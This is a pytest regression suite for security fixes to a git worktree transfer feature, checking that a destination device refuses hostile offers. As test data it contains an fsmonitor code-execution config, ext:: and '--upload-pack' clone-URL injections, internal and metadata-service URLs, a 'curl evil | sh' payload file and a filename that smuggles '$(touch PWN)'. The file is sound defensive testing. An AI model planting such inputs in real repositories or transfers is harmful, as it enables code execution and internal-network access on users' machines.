"""The DESTINATION decides what it receives (PR #4245 round 1: security S1-S8, review R1-R6, N1-N2).

The operator's request (2026-11-18): "we should be able to move the session and its
working data, worktrees, etc. all to a remote device ... Otherwise people could use the
move function and then realize all the work is not available."

Carrying the work means the destination writes repositories under its user's home on
the say-so of an offer another device built. Round 1 showed that offer could plant a
repository at ``~/.config/git`` (code execution on the next ``git status``), make the
destination dial URLs of the source's choosing with its credential helpers, and move
the user's existing branches. Each cell here is the regression test for one finding,
red on ``e2134b89f`` and green after the remediation; the S1/S2/S3 cells are seeded
from the security reviewer's repro scripts.
"""

from __future__ import annotations

import http.server
import json
import os
import subprocess
import threading
import time
from collections import namedtuple
from pathlib import Path
from typing import Any

import pytest

from local_operator.network import mobility, workset, workset_move, workset_probe
from local_operator.network import workset_transfer as wt
from tests.unit.network.workset_git_fixtures import (  # noqa: F401
    GIT_ENV,
    TEST_REMOTE,
    facts,
    git,
    git_env,
    make_rig,
    serve_origin_as_https,
    transfer,
    write,
)

pytestmark = pytest.mark.usefixtures("git_env")

#: The destination's import authority for these cells (security-lead ruling, #4245
#: round 2): a ``workset_import`` grant that holds for the whole transfer. The cells
#: that exercise the authority itself live in ``test_workset_import_grant``.
GRANT: dict[str, Any] = {"authority": "grant", "recheck": lambda: True}

SID = "0a1b2c3d4e5f6789"
EPOCH = "e1"
NOW = time.mktime((2026, 11, 18, 9, 30, 0, 0, 0, -1))


class _Server:
    """The destination relay as ``destination_transfer`` / ``restore_arrived`` see it."""

    def __init__(self, root: Path, home: Path) -> None:
        self.root = root
        self.workset_home = home

    def _member_name(self, device: str) -> str:
        return "src"


class _PlanOnly:
    """A source that answers the plan with nothing (the hostile-offer repro's source)."""

    def __init__(self) -> None:
        self.frames: list[dict[str, Any]] = []

    def ask(self, frame: dict[str, Any], **_kw: Any) -> dict[str, Any]:
        self.frames.append(dict(frame))
        return {"result": "planned", "artifacts": [], "left_behind": []}


def _dest(tmp_path: Path) -> tuple[Any, Path]:
    # ``Any``: a stand-in for the relay, typed loosely as the other workset tests do.
    home = tmp_path / "dsthome"
    root = tmp_path / "dstroot"
    home.mkdir()
    root.mkdir()
    return _Server(root, home), home


def _pending(server: _Server) -> dict[str, Any]:
    path = workset_move.incoming_staging(server.root, SID) / "pending.json"
    return json.loads(path.read_text())


# ------------------------------------------------------------------- S1: where


def test_s1_a_hostile_offer_cannot_plant_a_repository_under_dot_config(tmp_path: Path) -> None:
    """repro_s1: the offer names ``~/.config/git`` and a repository whose only file is
    ``config`` with an ``fsmonitor`` command. Before: cloned there, and the victim's
    next ``git status`` ran the command. Now: refused before any clone."""
    server, home = _dest(tmp_path)
    marker = tmp_path / "PWNED"
    src = tmp_path / "attacker"
    write(src / "config", f"[core]\n\tfsmonitor = touch {marker}; false\n")
    git(src, "init", "-q", "-b", "main")
    git(src, "add", "config")
    git(src, "commit", "-qm", "x")
    evil = tmp_path / "evil.git"
    git(tmp_path, "clone", "-q", "--bare", str(src), str(evil))
    offer = {
        "worktrees": [
            {
                "n": 0,
                "path": "~/.config/git",
                "repo": "~/.config/git",
                "remote_url": f"file://{evil}",
                "tips": [],
            }
        ]
    }
    transport = _PlanOnly()

    workset_move.destination_transfer(
        server,
        transport,
        SID,
        lease_epoch=EPOCH,
        offer=offer,
        owner_device="d_src",
        **GRANT,
    )

    assert not (home / ".config").exists()
    assert transport.frames[0]["decline"] == {"0": "restore_path_refused"}
    assert transport.frames[0]["have"] == {}
    assert _pending(server)["left_behind"] == [
        {"n": 0, "path": "~/.config/git", "reason": "restore_path_refused"}
    ]
    victim = home / "myrepo"
    victim.mkdir()
    git(victim, "init", "-q")
    git(victim, "status", "--short")
    assert not marker.exists()


@pytest.mark.parametrize(
    "repo",
    [
        "~/.config/git",
        "~/.ssh",
        "~/.local/share/x",
        "~/.gnupg/x",
        "~/.cache/x",
        "~/Library/LaunchAgents/x",
        "~/Applications/x",
        "~/code/autostart",
        "~/a/LaunchAgents/b",
        "~/projects/systemd/x",
        "~/code/../x",
        "/etc/x",
        "~/code/.hidden",
    ],
)
def test_s1_system_hidden_and_unsafe_paths_are_refused(tmp_path: Path, repo: str) -> None:
    assert wt.primary_path_refusal(tmp_path, repo, roots=("~",))


def test_s1_roots_narrow_where_a_repository_may_land(tmp_path: Path) -> None:
    roots = ("~/code", "not-a-root", "~/../escape")
    assert wt.primary_path_refusal(tmp_path, "~/code/proj", roots=roots) == ""
    assert wt.primary_path_refusal(tmp_path, "~/code", roots=roots) == ""
    assert wt.primary_path_refusal(tmp_path, "~/work/proj", roots=roots)
    assert wt.primary_path_refusal(tmp_path, "~/codex/proj", roots=roots)
    # An unreadable / empty allowlist refuses everything rather than widening.
    assert wt.primary_path_refusal(tmp_path, "~/proj", roots=())


def test_s1_the_lop_config_root_and_foreign_parents_are_refused(tmp_path: Path) -> None:
    (tmp_path / "lop").mkdir()
    assert wt.primary_path_refusal(tmp_path, "~/lop/x", roots=("~",), forbid=[tmp_path / "lop"])
    write(tmp_path / "afile", "x")
    assert wt.primary_path_refusal(tmp_path, "~/afile/proj", roots=("~",))


def test_s1_restore_roots_setting_is_read_and_fails_closed(tmp_path: Path) -> None:
    assert workset.restore_roots(tmp_path) == ("~",)  # absent key: the default
    (tmp_path / "config.yml").write_text(
        "values:\n  mesh:\n    move:\n      working_set_roots: ['~/code']\n"
    )
    assert workset.restore_roots(tmp_path) == ("~/code",)
    (tmp_path / "config.yml").write_text(
        "values:\n  mesh:\n    move:\n      working_set_roots: 7\n"
    )
    assert workset.restore_roots(tmp_path) == ()


@pytest.mark.parametrize(
    ("path", "want"),
    [
        ("~/proj/.worktrees/feat", "~/proj/.worktrees/feat"),
        ("~/proj-feat", "~/proj/.worktrees/proj-feat"),
        ("~/.config/git", "~/proj/.worktrees/git"),
        ("~/proj/.worktrees/a/b", "~/proj/.worktrees/b"),
        ("~/x/.hidden", f"~/proj/.worktrees/moved-{SID[:8]}-3"),
    ],
)
def test_s1_a_worktree_lands_only_under_its_primarys_worktrees(path: str, want: str) -> None:
    assert wt.worktree_target("~/proj", path, session_id=SID, n=3) == want


def test_s1_a_sibling_worktree_is_remapped_under_the_primary(tmp_path: Path) -> None:
    rig = make_rig(tmp_path, dirty=False)
    side = rig.src_home / "proj-side"
    git(rig.src_primary, "worktree", "add", "-q", "-b", "side", str(side), "main")
    write(side / "side.txt", "side\n")

    _snap, _plan, report = transfer(
        src_worktree=side,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
        now=NOW,
    )

    assert report.state == "restored", report
    assert report.dest_path == "~/proj/.worktrees/proj-side"
    assert report.remapped == ("~/proj-side", "~/proj/.worktrees/proj-side")
    assert not (rig.dst_home / "proj-side").exists()
    assert (rig.dst_home / "proj" / ".worktrees" / "proj-side" / "side.txt").is_file()


def test_s1_restore_refuses_a_primary_outside_the_roots(tmp_path: Path) -> None:
    rig = make_rig(tmp_path)
    snap = wt.snapshot(rig.worktree, SID, 0)
    art = wt.stage_bundle(rig.src_primary, snap.refs, [], tmp_path / "out")
    plan = wt.RestorePlan(
        session_id=SID,
        n=0,
        bundle_digest=art.digest,
        path="~/proj/.worktrees/feat",
        primary="~/proj",
        remote_url=str(rig.origin),
        head=snap.head,
        index=snap.index,
        worktree=snap.worktree,
        branch=snap.branch,
    )
    report = wt.restore(art.path.parent, plan, home=rig.dst_home, roots=("~/code",))
    assert (report.state, report.reason) == ("left_behind", "restore_path_refused")
    assert not (rig.dst_home / "proj" / ".worktrees").exists()


# ----------------------------------------------------------- S1c: rollback cleans


def test_s1c_only_a_clone_this_move_made_is_removed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path, clone_dest=False)
    url = serve_origin_as_https(monkeypatch, rig.origin, rig.src_primary)
    res = wt.clone_primary(
        url, "~/proj", home=rig.dst_home, pack_bytes=0, session_id=SID, lease_epoch=EPOCH
    )
    assert res.cloned and res.state == "present"
    other = rig.dst_home / "mine"
    git(tmp_path, "clone", "-q", str(rig.origin), str(other))  # the user's own, unmarked

    vet = {"config_root": tmp_path / "root", "roots": ("~",)}
    assert not wt.remove_own_clone(rig.dst_home, "~/proj", session_id=SID, lease_epoch="e2", **vet)
    assert not wt.remove_own_clone(rig.dst_home, "~/mine", session_id=SID, lease_epoch=EPOCH, **vet)
    assert (rig.dst_home / "proj").is_dir() and other.is_dir()

    staging = workset_move.incoming_staging(tmp_path / "root", SID)
    staging.mkdir(parents=True)
    (staging / workset_move.CLONED_JOURNAL).write_text(
        json.dumps(
            {
                "clones": [
                    {"path": "~/proj", "session_id": SID, "lease_epoch": EPOCH},
                    {"path": "~/mine", "session_id": SID, "lease_epoch": EPOCH},
                ]
            }
        )
    )
    workset_move.discard_incoming(tmp_path / "root", SID, home=rig.dst_home)
    assert not (rig.dst_home / "proj").exists()
    assert other.is_dir()
    assert not staging.exists()


def _plant_marked_session(home: Path, rel: str) -> Path:
    """A session directory that carries a forged ``.git/lop-cloned.json`` naming SID,
    EPOCH and its own path — the half of the rollback check a peer can supply."""
    target = home / rel.removeprefix("~/")
    (target / ".git").mkdir(parents=True)
    (target / "session.json").write_text("{}")
    (target / ".git" / wt.CLONE_MARKER).write_text(
        json.dumps({"session_id": SID, "lease_epoch": EPOCH, "path": rel})
    )
    return target


def test_s3_remove_own_clone_refuses_a_marked_session_dir(tmp_path: Path) -> None:
    """Security review #4245 round 6, S-3: a planted marker under ``sessions/`` is not
    enough — ``remove_own_clone`` vets the path itself (red before the fix: True, and
    the session directory was gone)."""
    home = tmp_path / "home"
    config = home / ".local-operator"
    rel = "~/.local-operator/sessions/abc123"
    session_dir = _plant_marked_session(home, rel)
    assert wt.primary_path_refusal(home, rel, roots=("~",), forbid=[config])

    removed = wt.remove_own_clone(
        home, rel, session_id=SID, lease_epoch=EPOCH, config_root=config, roots=("~",)
    )
    assert removed is False
    assert (session_dir / "session.json").is_file()

    # The config root is refused even where it is not under a dot directory.
    plain_config = home / "lopcfg"
    plain_rel = "~/lopcfg/sessions/abc123"
    plain_dir = _plant_marked_session(home, plain_rel)
    assert not wt.remove_own_clone(
        home,
        plain_rel,
        session_id=SID,
        lease_epoch=EPOCH,
        config_root=plain_config,
        roots=("~",),
    )
    assert (plain_dir / "session.json").is_file()


def test_s3_discard_incoming_never_removes_a_marked_session_dir(tmp_path: Path) -> None:
    """The real caller: a ``cloned.json`` row naming a marked session directory under
    the config root leaves it in place; the move's own staging is still swept."""
    home = tmp_path / "home"
    config = home / ".local-operator"
    rel = "~/.local-operator/sessions/abc123"
    session_dir = _plant_marked_session(home, rel)
    staging = workset_move.incoming_staging(config, SID)
    staging.mkdir(parents=True)
    (staging / workset_move.CLONED_JOURNAL).write_text(
        json.dumps({"clones": [{"path": rel, "session_id": SID, "lease_epoch": EPOCH}]})
    )
    workset_move.discard_incoming(config, SID, home=home)
    assert (session_dir / "session.json").is_file()
    assert not staging.exists()


# ------------------------------------------------------------------- S2: URLs


@pytest.mark.parametrize(
    "url",
    [
        "file:///tmp/evil.git",
        "/tmp/evil.git",
        "../evil.git",
        "http://github.com/a/b.git",
        "ext::sh -c touch% /tmp/pwned",
        "fd::17",
        "-uevil",
        "--upload-pack=touch /tmp/x",
        "https://127.0.0.1/a/b.git",
        "https://10.0.0.5/a/b.git",
        "ssh://192.168.1.2/a/b.git",
        "https://[::1]/a/b.git",
        "https://localhost/a/b.git",
        "git@169.254.169.254:a/b.git",
    ],
)
def test_s2_unsafe_clone_urls_are_refused(url: str) -> None:
    assert wt.clone_url_refusal(url) == "url_refused"


def test_s2_allowed_https_and_ssh_forms_are_accepted(monkeypatch: pytest.MonkeyPatch) -> None:
    # ``git.test`` does not resolve; the shared host policy accepts it only as a host
    # this device's operator named (``LOCAL_OPERATOR_MOVE_PROBE_HOSTS``).
    assert wt.clone_url_refusal(TEST_REMOTE) == "url_refused"
    monkeypatch.setenv("LOCAL_OPERATOR_MOVE_PROBE_HOSTS", "git.test")
    for url in (TEST_REMOTE, "ssh://git@git.test/a/b.git", "git@git.test:a/b.git"):
        assert wt.clone_url_refusal(url) == "", url


def test_s2_clone_primary_refuses_before_git_runs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    spawned: list[Any] = []
    monkeypatch.setattr(wt.subprocess, "Popen", lambda *a, **k: spawned.append(a))
    with pytest.raises(wt.MoveWorksetError) as info:
        wt.clone_primary("file:///tmp/x.git", "~/proj", home=tmp_path, pack_bytes=0)
    assert info.value.reason == "url_refused" and spawned == []
    assert not (tmp_path / "proj").exists()


def test_s2_the_clone_itself_refuses_a_local_transport(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Negative control for the hardening: an allowed https URL that the user's own
    config rewrites to a LOCAL path is still refused by git (``protocol.allow=never``,
    ``protocol.file.allow=never``), so the URL check is not the only guard."""
    rig = make_rig(tmp_path, clone_dest=False)
    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test",))
    monkeypatch.setattr(wt, "_CLONE_TEST_CONFIG", (f"url.{rig.origin}.insteadOf={TEST_REMOTE}",))
    with pytest.raises(wt.MoveWorksetError) as info:
        wt.clone_primary(TEST_REMOTE, "~/proj", home=rig.dst_home, pack_bytes=0)
    assert info.value.reason == "clone_failed"
    assert not (rig.dst_home / "proj").exists()


def test_s2_the_destination_dials_no_source_chosen_address(tmp_path: Path) -> None:
    """repro_s2: ``remote_url`` and an offered ``https_rewrite.url`` pointing at two
    local http servers. Before: both were dialled with credential helpers. Now: neither
    is (http and loopback are refused), and the source learns only ``url_refused``."""
    server, home = _dest(tmp_path)
    hits: list[str] = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:  # noqa: N802
            hits.append(self.path)
            self.send_response(401)
            self.end_headers()

        def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
            pass

    httpd = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    try:
        port = httpd.server_address[1]
        offer = {
            "worktrees": [
                {
                    "n": 0,
                    "path": "~/anything",
                    "repo": "~/anything",
                    "remote_url": f"http://127.0.0.1:{port}/first.git",
                    "https_rewrite": {"url": f"http://127.0.0.1:{port}/second.git"},
                }
            ]
        }
        transport = _PlanOnly()
        workset_move.destination_transfer(
            server,
            transport,
            SID,
            lease_epoch=EPOCH,
            offer=offer,
            owner_device="d_src",
            **GRANT,
        )
    finally:
        httpd.shutdown()
        thread.join(5)
    assert hits == []
    assert transport.frames[0]["decline"] == {"0": "url_refused"}
    assert not (home / "anything").exists()


def test_s2_only_the_locally_derived_https_form_is_tried(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    server, home = _dest(tmp_path)
    # The default clone policy (S9, round 2) clones only beside an existing repository.
    git(home, "init", "-q", str(home / "other"))
    monkeypatch.setattr(workset_probe, "_ALLOWED_HOSTS", ("git.test",))
    tried: list[str] = []

    def fake_clone(url: str, *_a: Any, **_k: Any) -> wt.PrimaryResolution:
        tried.append(url)
        raise wt.MoveWorksetError("clone_failed", "test")

    monkeypatch.setattr(wt, "clone_primary", fake_clone)
    offer = {
        "worktrees": [
            {
                "n": 0,
                "path": "~/proj/.worktrees/feat",
                "repo": "~/proj",
                "remote_url": "git@git.test:a/b.git",
                "https_rewrite": {"url": "https://elsewhere.test/steal.git"},
            }
        ]
    }
    transport = _PlanOnly()
    workset_move.destination_transfer(
        server,
        transport,
        SID,
        lease_epoch=EPOCH,
        offer=offer,
        owner_device="d_src",
        **GRANT,
    )
    assert tried == ["git@git.test:a/b.git", "https://git.test/a/b.git"]
    # S8: the precise reason stays here; the source learns a coarse one.
    assert transport.frames[0]["decline"] == {"0": "destination_declined"}
    assert _pending(server)["left_behind"][0]["reason"] == "destination_cannot_clone"


# ---------------------------------------------------------------- S3: branches


def test_s3_an_existing_branch_is_not_advanced_to_the_senders_commit(tmp_path: Path) -> None:
    """repro_s3: the destination has its own ``feat`` at the pushed tip, not checked out;
    the source adds a commit. Before: ``feat`` was fast-forwarded to it. Now: it stays,
    and the work lands on ``feat-moved-<device>``."""
    rig = make_rig(tmp_path)
    git(rig.dst_primary, "branch", "feat", "origin/feat")
    before = git(rig.dst_primary, "rev-parse", "feat")
    write(rig.worktree / "payload.sh", "curl evil | sh\n")
    git(rig.worktree, "add", "payload.sh")
    git(rig.worktree, "commit", "-qm", "innocuous")

    snap, _plan, report = transfer(
        src_worktree=rig.worktree,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
    )

    assert report.state == "restored", report
    assert git(rig.dst_primary, "rev-parse", "feat") == before
    assert report.branch == "feat-moved-laptop" and report.branch_moved is None
    assert git(rig.dst_primary, "rev-parse", "feat-moved-laptop") == snap.head


def test_s3_a_recalled_branch_advances_and_says_from_and_to(tmp_path: Path) -> None:
    """The one fast-forward left: this device's own departure journal recorded the
    branch at its current tip (a recall). The report carries ``(branch, from, to)``."""
    rig = make_rig(tmp_path)
    git(rig.dst_primary, "branch", "feat", "origin/feat")
    before = git(rig.dst_primary, "rev-parse", "feat")
    config = tmp_path / "dstconfig"
    journal = config / "network" / "workset-departed" / f"{SID}.json"
    journal.parent.mkdir(parents=True)
    journal.write_text(
        json.dumps(
            {
                "session_id": SID,
                "worktrees": [
                    {
                        "path": "~/elsewhere",
                        "branch": "feat",
                        "head": before,
                        # Round 2 N2: the journal names the repository too.
                        "common_dir": wt._common_dir(rig.dst_primary),
                    }
                ],
            }
        )
    )

    snap, _plan, report = transfer(
        src_worktree=rig.worktree,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
        config=config,
    )

    assert report.branch == "feat"
    assert report.branch_moved == ("feat", before, snap.head)
    assert git(rig.dst_primary, "rev-parse", "feat") == snap.head


def test_s3_the_receipt_states_a_moved_branch() -> None:
    from local_operator.network import workset_text

    block = {
        "transferred": True,
        "worktrees": [
            {
                "path": "~/proj/.worktrees/feat",
                "state": "restored",
                "dest_path": "~/proj/.worktrees/feat",
                "branch_moved": ["feat", "a" * 40, "b" * 40],
            }
        ],
    }
    lines = workset_text.receipt_lines(block, source="laptop")
    assert any("feat" in line and "a" * 12 in line and "b" * 12 in line for line in lines), lines


# ------------------------------------------------------------- S6 / R4: space


def test_s6_restore_checks_the_checkout_size_against_free_space(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path)
    usage = namedtuple("usage", "total used free")
    real = wt.shutil.disk_usage
    monkeypatch.setattr(
        wt.shutil,
        "disk_usage",
        lambda p: usage(10, 10, 1) if str(p).startswith(str(rig.dst_home)) else real(p),
    )
    _snap, _plan, report = transfer(
        src_worktree=rig.worktree,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
    )
    assert (report.state, report.reason) == ("pending_restore", "insufficient_space")
    assert not (rig.dst_home / "proj" / ".worktrees" / "feat").exists()


def test_s6_checkout_bytes_is_measured_from_the_objects(tmp_path: Path) -> None:
    rig = make_rig(tmp_path, dirty=False)
    write(rig.worktree / "big.bin", "x" * 100_000)
    git(rig.worktree, "add", "big.bin")
    git(rig.worktree, "commit", "-qm", "big")
    snap = wt.snapshot(rig.worktree, SID, 0)
    art = wt.stage_bundle(rig.src_primary, snap.refs, [], tmp_path / "out")
    measured = wt.measure_checkout(
        rig.dst_primary, art.path, wt.snapshot_ref(SID, 0, "worktree"), tmp_path / "scratch"
    )
    assert measured == wt.checkout_bytes(rig.src_primary, snap.worktree)
    assert measured >= 100_000
    assert list((tmp_path / "scratch").iterdir()) == []  # the probe repository is gone
    # Nothing was written into the user's repository.
    assert git(rig.dst_primary, "for-each-ref", "refs/measure") == ""


# ------------------------------------------- the destination's plan, fetch and replan


class _LocalOwner:
    """An owner serving staged artifacts from a directory: answers plans from a queue
    and fetches from the bytes on disk (the real ``_fetch_artifact`` checks run)."""

    def __init__(self, out: Path, plans: list[list[wt.Artifact]]) -> None:
        self.out = out
        self.plans = plans
        self.frames: list[dict[str, Any]] = []

    def ask(self, frame: dict[str, Any], **_kw: Any) -> dict[str, Any]:
        import base64
        import hashlib

        self.frames.append(dict(frame))
        if frame["phase"] == "workset_plan":
            arts = self.plans.pop(0)
            return {
                "result": "planned",
                "artifacts": [{"n": 0, "digest": a.digest, "bytes": a.bytes} for a in arts],
                "left_behind": [],
            }
        data = (self.out / frame["digest"].removeprefix("sha256:")).read_bytes()
        span = data[frame["offset"] : frame["offset"] + frame["limit"]]
        return {
            "result": "chunk",
            "digest": frame["digest"],
            "offset": frame["offset"],
            "size": len(data),
            "eof": frame["offset"] + len(span) >= len(data),
            "data": base64.b64encode(span).decode(),
            "chunk_sha256": hashlib.sha256(span).hexdigest(),
        }


def _offer_for(rig: Any, snap: wt.SnapshotRefs) -> dict[str, Any]:
    return {
        "worktrees": [
            {
                "n": 0,
                "path": "~/proj/.worktrees/feat",
                "repo": "~/proj",
                "remote_url": str(rig.origin),
                "head": snap.head,
                "index": snap.index,
                "worktree": snap.worktree,
                "branch": snap.branch,
                "tips": [snap.head],
            }
        ]
    }


def _thin_and_full(
    rig: Any, tmp_path: Path
) -> tuple[wt.SnapshotRefs, Path, wt.Artifact, wt.Artifact]:
    """A THIN bundle whose prerequisite (the unpushed head) the destination lacks, so it
    fails ``bundle verify`` there, and the full bundle the re-plan carries."""
    snap = wt.snapshot(rig.worktree, SID, 0)
    out = tmp_path / "owner-out"
    thin = wt.stage_bundle(rig.src_primary, snap.refs, [snap.head], out)
    full = wt.stage_bundle(rig.src_primary, snap.refs, [], out)
    assert thin.digest != full.digest
    return snap, out, thin, full


def test_r6_the_inline_replan_fetches_the_full_bundle_once(tmp_path: Path) -> None:
    rig = make_rig(tmp_path)
    snap, out, thin, full = _thin_and_full(rig, tmp_path)
    server: Any = _Server(tmp_path / "dstroot", rig.dst_home)
    server.root.mkdir()
    owner = _LocalOwner(out, [[thin], [full]])

    workset_move.destination_transfer(
        server,
        owner,
        SID,
        lease_epoch=EPOCH,
        offer=_offer_for(rig, snap),
        owner_device="d_src",
        **GRANT,
    )

    plans = [f for f in owner.frames if f["phase"] == "workset_plan"]
    # The destination holds none of the tips here, so both ask with an empty ``have``;
    # the point is that exactly one re-plan happened and the full bundle was used.
    assert [p["have"] for p in plans] == [{"0": []}, {"0": []}]
    (plan,) = _pending(server)["plans"]
    assert plan["bundle_digest"] == full.digest


def test_r3_the_replan_rechecks_this_devices_cap(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path)
    snap, out, thin, full = _thin_and_full(rig, tmp_path)
    server: Any = _Server(tmp_path / "dstroot", rig.dst_home)
    server.root.mkdir()
    owner = _LocalOwner(out, [[thin], [full]])
    monkeypatch.setattr(workset, "cap_bytes", lambda root=None: thin.bytes)

    with pytest.raises(workset_move.WorksetTransferRefused) as info:
        workset_move.destination_transfer(
            server,
            owner,
            SID,
            lease_epoch=EPOCH,
            offer=_offer_for(rig, snap),
            owner_device="d",
            **GRANT,
        )

    assert info.value.code == "working_set_over_cap"
    fetched = {f["digest"] for f in owner.frames if f["phase"] == "workset_fetch"}
    assert fetched == {thin.digest}  # not a byte of the over-cap full bundle


def test_r4_the_checkout_size_is_checked_before_ready(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path)
    snap = wt.snapshot(rig.worktree, SID, 0)
    out = tmp_path / "owner-out"
    full = wt.stage_bundle(rig.src_primary, snap.refs, [], out)
    server: Any = _Server(tmp_path / "dstroot", rig.dst_home)
    server.root.mkdir()
    usage = namedtuple("usage", "total used free")
    real = workset_move.shutil.disk_usage
    monkeypatch.setattr(
        workset_move.shutil,
        "disk_usage",
        lambda p: usage(10, 10, 1) if str(p) == str(rig.dst_home) else real(p),
    )

    with pytest.raises(workset_move.WorksetTransferRefused) as info:
        workset_move.destination_transfer(
            server,
            _LocalOwner(out, [[full]]),
            SID,
            lease_epoch=EPOCH,
            offer=_offer_for(rig, snap),
            owner_device="d",
            **GRANT,
        )
    assert info.value.code == "insufficient_space"


# ----------------------------------------------------------------- S7: recipes


def test_s7_a_recipe_never_carries_an_unsafe_filename(tmp_path: Path) -> None:
    write(tmp_path / "wt" / "requirements$(touch PWN).txt", "x\n")
    assert wt.recipes_for(tmp_path / "wt", tmp_path / "wt") == []
    write(tmp_path / "wt" / "requirements-dev.txt", "x\n")
    (recipe,) = wt.recipes_for(tmp_path / "wt", tmp_path / "wt")
    assert recipe.run == "uv venv && uv pip install -r requirements-dev.txt"


# ------------------------------------------------------------------- S8: oracle


def test_s8_have_never_reveals_a_local_only_commit(tmp_path: Path) -> None:
    rig = make_rig(tmp_path)
    git(rig.dst_primary, "checkout", "-q", "-b", "private")
    write(rig.dst_primary / "p.txt", "mine\n")
    git(rig.dst_primary, "add", "p.txt")
    git(rig.dst_primary, "commit", "-qm", "private work")
    private = git(rig.dst_primary, "rev-parse", "HEAD")
    pushed = git(rig.dst_primary, "rev-parse", "origin/main")
    assert wt.compute_have(rig.dst_primary, [private, pushed], remote="origin") == [pushed]


def test_s8_state_dependent_declines_reach_the_source_coarse(tmp_path: Path) -> None:
    server, home = _dest(tmp_path)
    write(home / "proj" / "not-a-repo.txt", "x\n")  # an existing non-repository: conflict
    offer = {
        "worktrees": [
            {"n": 0, "path": "~/proj/.worktrees/f", "repo": "~/proj", "remote_url": TEST_REMOTE}
        ]
    }
    transport = _PlanOnly()
    workset_move.destination_transfer(
        server,
        transport,
        SID,
        lease_epoch=EPOCH,
        offer=offer,
        owner_device="d_src",
        **GRANT,
    )
    assert transport.frames[0]["decline"] == {"0": "destination_declined"}
    assert _pending(server)["left_behind"][0]["reason"] == "destination_conflict"


# ------------------------------------------------------------- R1: cwd retarget


def test_r1_the_cwd_follows_the_deepest_restored_tree(tmp_path: Path) -> None:
    from local_operator.network import carry

    server, home = _dest(tmp_path)
    (server.root / "sessions" / SID).mkdir(parents=True)
    primary_copy = home / "proj" / ".worktrees" / "moved-0a1b2c3d"
    feat = home / "proj" / ".worktrees" / "feat"
    primary_copy.mkdir(parents=True)
    feat.mkdir(parents=True)
    rows = [
        {"path": "~/proj", "dest_path": "~/proj/.worktrees/moved-0a1b2c3d", "state": "restored"},
        {
            "path": "~/proj/.worktrees/feat",
            "dest_path": "~/proj/.worktrees/feat",
            "state": "restored",
        },
    ]
    workset_move._retarget_cwd(server, SID, "~/proj/.worktrees/feat", rows, home)
    marker = json.loads((server.root / "sessions" / SID / carry.DESKTOP_MARKER_NAME).read_text())
    assert marker["cwd"] == str(feat)


# -------------------------------------------------------- R2: retry idempotence


def test_r2_a_fresh_clone_primary_restored_twice_is_idempotent(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path, clone_dest=False)
    url = serve_origin_as_https(monkeypatch, rig.origin, rig.src_primary)
    write(rig.src_primary / "scratch.txt", "dirty primary\n")  # untracked on the source
    wt.clone_primary(
        url, "~/proj", home=rig.dst_home, pack_bytes=0, session_id=SID, lease_epoch=EPOCH
    )
    _snap, plan, first = transfer(
        src_worktree=rig.src_primary,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
        is_primary=True,
        fresh_clone=True,
    )
    assert (first.state, first.mode) == ("restored", "in_place"), first

    again = wt.restore(tmp_path / "w" / "in" / f"{SID}-0", plan, home=rig.dst_home)

    assert (again.state, again.mode, again.dest_path) == ("restored", "idempotent", "~/proj")


def test_r2_a_beside_restore_retried_is_recognised_not_duplicated(tmp_path: Path) -> None:
    rig = make_rig(tmp_path)
    write(rig.dst_primary / ".worktrees" / "feat" / "theirs.txt", "unrelated\n")
    _snap, plan, first = transfer(
        src_worktree=rig.worktree,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
        now=NOW,
    )
    assert first.mode == "beside", first

    again = wt.restore(tmp_path / "w" / "in" / f"{SID}-0", plan, home=rig.dst_home, now=NOW + 180)

    assert (again.mode, again.dest_path) == ("idempotent", first.dest_path)
    listed = git(rig.dst_primary, "worktree", "list", "--porcelain")
    assert listed.count(".moved-") == 1, listed


# ------------------------------------------------------------- N1 / N2 neighbours


def test_n1_an_arrival_leaves_this_devices_departure_refs_alone(tmp_path: Path) -> None:
    rig = make_rig(tmp_path)
    keep = git(rig.dst_primary, "rev-parse", "origin/main")
    git(rig.dst_primary, "update-ref", f"refs/lop/move/{SID}/0/head", keep)
    _snap, _plan, report = transfer(
        src_worktree=rig.worktree,
        src_primary=rig.src_primary,
        src_home=rig.src_home,
        dst_home=rig.dst_home,
        work=tmp_path / "w",
        session_id=SID,
    )
    assert report.state == "restored"
    assert git(rig.dst_primary, "rev-parse", f"refs/lop/move/{SID}/0/head") == keep


def test_n2_a_failed_worktree_add_leaves_no_branch_behind(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    rig = make_rig(tmp_path)
    real = wt._git

    def failing(cwd: Any, *args: str, **kw: Any) -> Any:
        if args[:2] == ("worktree", "add"):
            raise wt.MoveWorksetError("git_failed", "injected")
        return real(cwd, *args, **kw)

    monkeypatch.setattr(wt, "_git", failing)
    with pytest.raises(wt.MoveWorksetError):
        transfer(
            src_worktree=rig.worktree,
            src_primary=rig.src_primary,
            src_home=rig.src_home,
            dst_home=rig.dst_home,
            work=tmp_path / "w",
            session_id=SID,
        )
